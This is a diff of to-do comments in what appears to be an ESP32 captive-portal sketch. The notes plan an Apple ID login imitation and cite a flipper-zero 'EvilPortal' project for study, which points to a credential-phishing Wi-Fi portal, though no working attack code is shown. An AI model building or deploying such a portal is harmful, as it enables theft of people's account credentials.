@@ -1,22 +1,14 @@
-/* still a degenerate
+/* 
 to do
-  1.)    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-   the above isnt viable since there isnt any internet connection 
-   options copy the file with littlefs 
-    or
-   use images for the logos
-
-  2.) use of POST instead of get 
-
-  3.) fix the css, rather streamline it
-
-
-  2. no redirection to warning page just a "#"
+  1.) use of POST instead of get 
+  2.) Use happy colors 4 more a more positive energy (for now try blue and peach) yellow, orange, pink, red, peach, light pink and lilac.
   3. "Forgot Apple ID or Password" and "Create yours now" buttons need to be redirecred somwwhere
-  4. Study >>> https://github.com/bigbrodude6119/flipper-zero-evil-portal/blob/main/esp32/EvilPortal/EvilPortal.ino
+  4. Continous Study >>> https://github.com/bigbrodude6119/flipper-zero-evil-portal/blob/main/esp32/EvilPortal/EvilPortal.ino
 
 */
-// Dynamic captive portal
+
+
+  // ˗ˏˋ 𒉭  Dynamic captive portal  𒉭 ˊˎ˗
 
 //Define libraries & variables
 #include <DNSServer.h>
